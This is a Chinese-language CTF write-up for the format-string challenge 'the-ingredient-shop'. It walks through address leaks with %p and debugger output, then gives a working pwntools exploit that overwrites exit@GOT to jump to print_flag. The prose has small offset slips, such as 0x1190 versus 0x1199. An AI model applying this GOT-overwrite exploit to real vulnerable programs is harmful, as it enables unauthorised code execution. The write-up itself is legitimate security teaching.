---
title: BrunnerCTF_the-ingredient-shop_writeup
tags: [pwn, CTF]

---



## 前情提要

### [格式化字串](https://ithelp.ithome.com.tw/m/articles/10359287)
printf(user_input); 會把整條使用者字串當「格式字串」解讀；若字串包含 %p/%x/%n 等格式符號，函式會擅自讀寫堆疊，造成洩漏或覆寫。
最危險的 %n 可把「目前已輸出字元數」寫到任意地址，進而改變程式流程。

解題思路通常分兩步：
* 利用 %p 讀堆疊 → 洩漏位址、金絲雀、基底等資訊。
* 利用 %n/%hn/%hhn 寫任意值 → 覆寫 GOT、返回位址或重要變數。


既然要洩漏地址，那總得知道哪些地址的"樣子"，代表甚麼。

### Libc 位址 (函式庫)
特徵: 通常以 0x7f... 開頭。

原因: 這是 Linux 為共享函式庫（Shared Libraries）預留的巨大虛擬記憶體空間。當你看到一個 0x7f 開頭的位址，你有 99% 的把握可以認為它和某個函式庫有關，最常見的就是 libc.so.6

那可能會有很多的0x7f開頭的，要找哪個呢?
```
pwndbg> info symbol 0x7ffff7e9e887
write + 23 in section .text of /lib/x86_64-linux-gnu/libc.so.6

pwndbg> info symbol 0x7ffff7fa6a70
_IO_stdfile_1_lock in section .bss of /lib/x86_64-linux-gnu/libc.so.6
```

* .text段:
    存程式碼的地方，可讀可執行。
ret2libc 是要去執行system函式，這些指令會放在.text段。
我們需要洩漏一個指向 .text 區段的位址，才能計算出 system 的確切位置


* PIE地址:
```
pwndbg> piebase
Calculated VA from /mnt/f/ctf/brunner/pwn_the-ingredient-shop/shop = 0x555555554000
```
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x555555554000     0x555555555000 r--p     1000      0 shop
    0x555555555000     0x555555556000 r-xp     1000   1000 shop
    0x555555556000     0x555555557000 r--p     1000   2000 shop
    ....
```
第一行 (...4000): 這是 ./shop 檔案被映射到記憶體中的最低位址。你可以看到它的 Offset 是 0，代表它對應到檔案的開頭（包含 ELF Header 等元數據）。

第二行 (...5000): 這是程式碼段 (.text) 被映射到的位址。它的權限是 r-xp (可讀可執行)。它的 Offset 是 1000 (4096)，代表它對應到檔案內偏移量為 0x1000 的地方

如果遇到很多個0x55555555xxxx的地址，找哪個?
`info symbol 0x55555555xxxx`
慢慢看要找哪個
```
pwndbg> info symbol 0x5555555596b0
No symbol matches 0x5555555596b0.

pwndbg>  info symbol 0x555555555348
main in section .text of /mnt/f/ctf/brunner/pwn_the-ingredient-shop/shop
```


### Canary 
*  一個 64 位元的隨機數，但最低位元組必定是 0x00。所以它在記憶體中看起來會像 XXXXXXXXXXXXXX00
*  這個 00 (NULL byte) 是為了防止 strcpy、puts 等字串操作函式輕易地洩漏或覆蓋它。因為這些函式一碰到 NULL 就會停止 



----
程式流程
輸入0,1,2,3，輸入3跳出無窮迴圈
![image](https://hackmd.io/_uploads/rkqQqtatll.png)


checksec
```
[*] '/mnt/f/ctf/brunner/pwn_the-ingredient-shop/shop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
* Partial RELRO：GOT 可寫 → 可以覆寫 GOT。
* Canary：開啟 → 溢位必須先洩漏Canary。
* NX + PIE：堆疊不可執行且基底隨機 → 建議用 GOT overwrite / ret2libc，而非手寫 shellcode。

**目標明確: GOT覆蓋**


挑出重要Functions (main,get_input,print_flag,exit@plt)
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  __stack_chk_fail@plt
0x0000000000001050  system@plt
0x0000000000001060  printf@plt
0x0000000000001070  fgets@plt
0x0000000000001080  atoi@plt
0x0000000000001090  exit@plt
0x00000000000010a0  __cxa_finalize@plt
0x00000000000010b0  _start
0x00000000000010e0  deregister_tm_clones
0x0000000000001110  register_tm_clones
0x0000000000001150  __do_global_dtors_aux
0x0000000000001190  frame_dummy
0x0000000000001199  print_flag
0x00000000000011af  butter
0x00000000000011c5  sugar
0x00000000000011db  flour
0x00000000000011f1  exit_program
0x00000000000011ff  get_input
0x0000000000001348  main
0x0000000000001354  _fini
```

省流
get_input很長，但總之就是它有設定好fget，沒辦法bof,然後重點是它直接print(buffer)。

>    0x000000000000128e <+143>:   lea    rax,[rbp-0x110]
>    0x0000000000001295 <+150>:   mov    rdi,rax
>    0x0000000000001298 <+153>:   mov    eax,0x0
>    0x000000000000129d <+158>:   call   0x1060 <printf@plt>


```
Dump of assembler code for function get_input:
   0x00000000000011ff <+0>:     push   rbp
   0x0000000000001200 <+1>:     mov    rbp,rsp
   0x0000000000001203 <+4>:     sub    rsp,0x120
   0x000000000000120a <+11>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001213 <+20>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001217 <+24>:    xor    eax,eax
   0x0000000000001219 <+26>:    lea    rax,[rip+0xe28]        # 0x2048
   0x0000000000001220 <+33>:    mov    rdi,rax
   0x0000000000001223 <+36>:    call   0x1030 <puts@plt>
   0x0000000000001228 <+41>:    lea    rax,[rip+0xe43]        # 0x2072
   0x000000000000122f <+48>:    mov    rdi,rax
   0x0000000000001232 <+51>:    call   0x1030 <puts@plt>
   0x0000000000001237 <+56>:    lea    rax,[rip+0xe3e]        # 0x207c
   0x000000000000123e <+63>:    mov    rdi,rax
   0x0000000000001241 <+66>:    call   0x1030 <puts@plt>
   0x0000000000001246 <+71>:    lea    rax,[rip+0xe38]        # 0x2085
   0x000000000000124d <+78>:    mov    rdi,rax
   0x0000000000001250 <+81>:    call   0x1030 <puts@plt>
   0x0000000000001255 <+86>:    lea    rax,[rip+0xe32]        # 0x208e
   0x000000000000125c <+93>:    mov    rdi,rax
   0x000000000000125f <+96>:    call   0x1030 <puts@plt>
   0x0000000000001264 <+101>:   mov    rdx,QWORD PTR [rip+0x2de5]        # 0x4050 <stdin@GLIBC_2.2.5>
   0x000000000000126b <+108>:   lea    rax,[rbp-0x110]
   0x0000000000001272 <+115>:   mov    esi,0x100
   0x0000000000001277 <+120>:   mov    rdi,rax
   0x000000000000127a <+123>:   call   0x1070 <fgets@plt>
   0x000000000000127f <+128>:   lea    rax,[rip+0xe10]        # 0x2096
   0x0000000000001286 <+135>:   mov    rdi,rax
   0x0000000000001289 <+138>:   call   0x1030 <puts@plt>
   0x000000000000128e <+143>:   lea    rax,[rbp-0x110]
   0x0000000000001295 <+150>:   mov    rdi,rax
   0x0000000000001298 <+153>:   mov    eax,0x0
   0x000000000000129d <+158>:   call   0x1060 <printf@plt>
   0x00000000000012a2 <+163>:   lea    rax,[rip+0xe01]        # 0x20aa
   0x00000000000012a9 <+170>:   mov    rdi,rax
   0x00000000000012ac <+173>:   call   0x1030 <puts@plt>
   0x00000000000012b1 <+178>:   lea    rax,[rbp-0x110]
   0x00000000000012b8 <+185>:   mov    rdi,rax
   0x00000000000012bb <+188>:   call   0x1080 <atoi@plt>
   0x00000000000012c0 <+193>:   mov    edx,eax
   0x00000000000012c2 <+195>:   neg    edx
   0x00000000000012c4 <+197>:   cmovns eax,edx
   0x00000000000012c7 <+200>:   mov    DWORD PTR [rbp-0x114],eax
   0x00000000000012cd <+206>:   cmp    DWORD PTR [rbp-0x114],0x3
   0x00000000000012d4 <+213>:   je     0x131a <get_input+283>
   0x00000000000012d6 <+215>:   cmp    DWORD PTR [rbp-0x114],0x3
   0x00000000000012dd <+222>:   jg     0x1321 <get_input+290>
   0x00000000000012df <+224>:   cmp    DWORD PTR [rbp-0x114],0x2
   0x00000000000012e6 <+231>:   je     0x1313 <get_input+276>
   0x00000000000012e8 <+233>:   cmp    DWORD PTR [rbp-0x114],0x2
   0x00000000000012ef <+240>:   jg     0x1321 <get_input+290>
   0x00000000000012f1 <+242>:   cmp    DWORD PTR [rbp-0x114],0x0
   0x00000000000012f8 <+249>:   je     0x1305 <get_input+262>
   0x00000000000012fa <+251>:   cmp    DWORD PTR [rbp-0x114],0x1
   0x0000000000001301 <+258>:   je     0x130c <get_input+269>
   0x0000000000001303 <+260>:   jmp    0x1321 <get_input+290>
   0x0000000000001305 <+262>:   call   0x11af <butter>
   0x000000000000130a <+267>:   jmp    0x1331 <get_input+306>
   0x000000000000130c <+269>:   call   0x11c5 <sugar>
   0x0000000000001311 <+274>:   jmp    0x1331 <get_input+306>
   0x0000000000001313 <+276>:   call   0x11db <flour>
   0x0000000000001318 <+281>:   jmp    0x1331 <get_input+306>
   0x000000000000131a <+283>:   call   0x11f1 <exit_program>
   0x000000000000131f <+288>:   jmp    0x1331 <get_input+306>
   0x0000000000001321 <+290>:   lea    rax,[rip+0xd83]        # 0x20ab
   0x0000000000001328 <+297>:   mov    rdi,rax
   0x000000000000132b <+300>:   call   0x1030 <puts@plt>
   0x0000000000001330 <+305>:   nop
   0x0000000000001331 <+306>:   nop
   0x0000000000001332 <+307>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001336 <+311>:   sub    rax,QWORD PTR fs:0x28
   0x000000000000133f <+320>:   je     0x1346 <get_input+327>
   0x0000000000001341 <+322>:   call   0x1040 <__stack_chk_fail@plt>
   0x0000000000001346 <+327>:   leave
   0x0000000000001347 <+328>:   ret
```


User_input
利用格式化字串漏洞，開始洩漏出位置
```
Welcome to the Brunnerne ingredient shop.
0) Butter
1) Sugar
2) Flour
3) exit
.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
here is your choice

.0x1.0x1.0x7ffff7e9e887.0x7ffff7fa6a70.0x5555555596b0.(nil).

(nil).0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.
0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.
0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.
0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70.0x7fffffffe239.0xac34d84203c36d00.0x7fffffffdec0.
0x555555555351.

0x1.0x7ffff7db3d90.(nil).0x555555555348.0x1ffffdfc0.0x7fffffffdfd8.(nil).0x3591cbf2f488d67d.0x7fffffffdfd8.0x555555555348.0x555555557dd8.0x7ffff7ffd040.0xca6e340d492ad67d.0xca6e24448e02d67d.0x7fff00000000.(nil).(nil).(nil).(nil).0xac34d84203c36d00.(nil).0x7ffff7db3e40.0x7fffffffdfe8.0x555555557dd8.0x7ffff7ffe2e0.(nil).(nil).0x5555555550b0.0x7fffffffdfd0.(nil).(nil).0x5555555550d1.0x7fffffffdfc8.0x1c.0x1.0x7fffffffe242.(nil).0x7fffffffe272.0x7fffffffe282.0x7fffffffe29a.0x7fffffffe2b7.0x7fffffffe2cc
```


這裡雖然列出了三個位置，但只用的到main+9這個位置，我們也不需要去知道canary在哪，我也沒有要做bof，我只要能去算出PIE BASE，然後加print_flag的offset ，得到print_flag後，將print_flag的絕對位置放入exit@got所存放的記憶體位置中，在呼叫exit的時候就可以跳過去了。

* %3$p  0x7ffff7e9e887
* %40$p 0xac34d84203c36d00
* **%43$p 0x555555555351    main+9**


只用的到0x555555555351，前面的那些就當作知識了解一下。

具體的觀察got
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /mnt/f/ctf/brunner/pwn_the-ingredient-shop/shop:
GOT protection: Partial RELRO | Found 7 GOT entries passing the filter
[0x555555558000] puts@GLIBC_2.2.5 -> 0x555555555036 (puts@plt+6) ◂— push 0 /* 'h' */
[0x555555558008] __stack_chk_fail@GLIBC_2.4 -> 0x555555555046 (__stack_chk_fail@plt+6) ◂— push 1
[0x555555558010] system@GLIBC_2.2.5 -> 0x555555555056 (system@plt+6) ◂— push 2
[0x555555558018] printf@GLIBC_2.2.5 -> 0x555555555066 (printf@plt+6) ◂— push 3
[0x555555558020] fgets@GLIBC_2.2.5 -> 0x555555555076 (fgets@plt+6) ◂— push 4
[0x555555558028] atoi@GLIBC_2.2.5 -> 0x555555555086 (atoi@plt+6) ◂— push 5
[0x555555558030] exit@GLIBC_2.2.5 -> 0x555555555096 (exit@plt+6) ◂— push 6
```

這行[0x555555558030] exit@GLIBC_2.2.5 -> 0x555555555096 (exit@plt+6)
意義重大，因為在我們輸入3離開這個無窮迴圈的時候，只要能把0x555555555096換成print_flag的位置就好了。


說那麼多，那print_flag在哪?
這時要用到 base_addr = leak_addr - offset
那leak_addr是多少? 在%43$p這裡去洩漏出來就會得到了，因每次執行程式都會有不同的結果(ASLR)，不論如何，這都是main+9的絕對位置。

offet 是 main +9   知道main 在0x1348後(info functions有列出來)，這裡就是 0x134+9 = 0x1351。

按照步驟操作:
1. leak_addr - 0x1351 會得到 base_addr 
2. base_addr + print_flag的offset(0x1190) 就是 print_flag的絕對位置
3. 最後用 base_addr + exit_offset得到 exit@got的絕對位置

用底下這個指令得到exit@got偏移 0x4030
```
objdump -R ./shop
```
```
0000000000004030 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
```


----
## Exploit

```
#!/usr/bin/env python3
from pwn import *

# ===========================================================
#                      設定 & 連線
# ===========================================================
context(os='linux', arch='amd64', log_level='info')
exe = ELF("./shop")
io = process(exe.path)


gdb.attach(io, gdbscript='''

   # 在 exit 被呼叫前下斷點
   b *exit_program+14
   continue
''')
# ===========================================================
#               第一步: 洩漏一個執行中的位址
# ===========================================================
log.info("步驟 1: 洩漏 main+9 的絕對位址...")
leak_offset_in_stack = 43
payload_leak = f"%{leak_offset_in_stack}$p".encode()
io.sendlineafter(b'exit\n', payload_leak)
io.recvuntil(b'here is your choice\n')
leaked_addr_str = io.recvline().strip()
leaked_addr = int(leaked_addr_str, 16) # 這是 main+9 在這次執行中的「絕對位址」
log.success(f"成功洩漏出 main+9 的位址: {hex(leaked_addr)}")

# ===========================================================
#               第二步: 手動進行位址計算
# ===========================================================
log.info("步驟 2: 進行手動位址計算...")

# 從 ELF 檔案中讀取固定的「相對偏移量」
offset_main_plus_9 = 0x1351
offset_print_flag = 0x1199 
offset_exit_got = 0x4030       

# 核心公式： PIE Base = 絕對位址 - 相對偏移量
pie_base = leaked_addr - offset_main_plus_9
log.success(f"計算出的 PIE Base: {hex(pie_base)}")

# 根據 PIE Base 計算出我們需要的其他絕對位址
# 絕對位址 = PIE Base + 相對偏移量
target_addr_print_flag = pie_base + offset_print_flag
target_addr_exit_got = pie_base + offset_exit_got
log.info(f"計算出的 print_flag 絕對位址: {hex(target_addr_print_flag)}")
log.info(f"計算出的 exit@got 絕對位址: {hex(target_addr_exit_got)}")

# ===========================================================
#             第三步: 覆寫 GOT 表 & 觸發漏洞
# ===========================================================
log.info("步驟 3: 產生 payload 並覆寫 exit@got...")

# 使用我們手動算出來的位址來產生 payload
payload_overwrite = fmtstr_payload(8, {
    target_addr_exit_got: target_addr_print_flag
})
io.sendlineafter(b'exit\n', payload_overwrite)

log.info("步驟 4: 觸發被覆寫的函式...")
io.sendlineafter(b'exit\n', b'3')

log.success("攻擊觸發！應該能看到 Flag 了：")
io.interactive()
```

用上面腳本，可以觀察到exit@got內容前後的改變，也就是我們成功改寫了GOT。
![image](https://hackmd.io/_uploads/BJX5Q5aKlg.png)
原來的exit@got樣子
![image](https://hackmd.io/_uploads/BJdk7qatlg.png)
exit@got成功指向了print_flag的位置
![image](https://hackmd.io/_uploads/H1-kQ9aYgl.png)
